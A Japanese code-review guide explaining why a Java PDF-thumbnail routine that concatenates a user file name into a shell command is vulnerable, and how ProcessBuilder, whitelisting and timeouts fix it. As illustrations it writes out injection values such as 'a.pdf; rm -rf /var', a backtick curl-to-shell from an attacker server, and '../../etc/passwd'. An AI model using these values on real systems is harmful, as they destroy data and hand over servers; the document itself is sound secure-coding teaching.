## ❌ NGポイント (bad/ 配下)

1. **ユーザー由来のファイル名をシェルコマンド文字列に連結している＝コマンドインジェクション（核心・重大）**: `"sh -c pdftoppm ... " + fileName` のように、外部から来た `fileName` をシェルに渡す1本の文字列へ直接くっつけている。攻撃者が `fileName` に `a.pdf; rm -rf /var` や `` a.pdf `curl 攻撃者サーバー | sh` `` のような値を仕込むと、サーバー上で**任意の OS コマンドが実行**されてしまう。SQL インジェクションのコマンド版で、被害はサーバー乗っ取りに直結する最悪クラスの脆弱性。

2. **パストラバーサル：`fileName` に `../` を入れられる（セキュリティ副次）**: 仮にインジェクションを塞いでも、`fileName` を検証せずパスに連結しているので `../../etc/passwd` のような値で意図しない場所を読み書きされうる。

3. **`Runtime.exec(String)` の空白分割の罠と、出力を読まない waitFor でのハング（中〜高・気づきにくい）**: `exec(String)` は文字列を単純に空白で区切って引数にするため、スペースを含むパスなどで意図せぬ分割が起きる。さらに、子プロセスの標準出力/標準エラーを読み捨てずに `waitFor()` すると、出力バッファが一杯になった時点でプロセスが書き込めず停止し、こちらは永遠に待ち続ける（デッドロック的ハング）。タイムアウトも無い。

4. **例外を握りつぶして `printStackTrace` だけ（低〜中）**: 変換に失敗しても呼び出し側には何も伝わらず、標準エラーに出るだけ。失敗が握りつぶされる。

5. **パスのハードコード（低）**: `/var/uploads`・`/var/thumbs` を直書きしており、環境ごとに差し替えられずテストもしづらい。

## ⭕️ 改善案 (good/ 配下)

1. **シェルを介さず、`ProcessBuilder` にコマンドと引数を「配列」で分けて渡す**: `new ProcessBuilder("pdftoppm", "-png", input, output)` のように1要素ずつ渡せば、シェルが介在しないので引数中の `;` や `|` は**ただの文字列**として扱われ、コマンドとして解釈されない＝インジェクションが原理的に成立しない。

2. **入力を検証する**: ファイル名を `[A-Za-z0-9_-]+\.pdf` のようなホワイトリストで検証し、パス区切りや `..` を含む値は入口で弾く。パスの合成は文字列連結ではなく `dir.resolve(fileName)` を使う。

3. **出力を読み切り、タイムアウトを設ける**: `redirectErrorStream(true)` で出力をまとめて読み捨て、`waitFor(30, SECONDS)` で無限待ちを避け、タイムアウト時は `destroyForcibly()` する。ハングとゾンビプロセスを防ぐ。

4. **例外は握りつぶさず、原因付きで投げ直す**: 失敗を呼び出し側に伝える。`InterruptedException` は割り込み状態を復元してから再通知する。

5. **パスは外から注入する**: `uploadDir` / `thumbDir` をコンストラクタで受け取り、環境依存を排除する。

## 💬 レビューコメント例文

> 外部ツールを呼んでサムネイルを作る、という発想自体は現実的でOKです。ただ、これは今すぐ止めなければいけない重大な脆弱性を含んでいます。ユーザーが決めたファイル名を、そのままシェルのコマンド文字列に連結していますよね。ここに `a.pdf; rm -rf /var` のような値を入れられると、サーバー上で好きなコマンドを実行されてしまうんです。いわゆるコマンドインジェクションで、サーバー乗っ取りに直結します。

> 直し方の肝は「シェルに1本の文字列を渡さない」ことです。`ProcessBuilder` を使って `new ProcessBuilder("pdftoppm", "-png", 入力パス, 出力パス)` のように、コマンドと引数を1個ずつ配列で渡してください。こうするとシェルを経由しないので、引数に `;` や `|` が入っていても「ただの文字の並び」として扱われ、コマンドとして解釈されません。あわせて、ファイル名は `[A-Za-z0-9_-]+\.pdf` のようなホワイトリストで検証して `..` を弾き、パスは `dir.resolve(名前)` で組み立てましょう。最後に、子プロセスの出力を読み捨てずに `waitFor()` するとバッファが詰まってハングするので、出力を読み切ってタイムアウト付きで待つようにしておくと安心です。
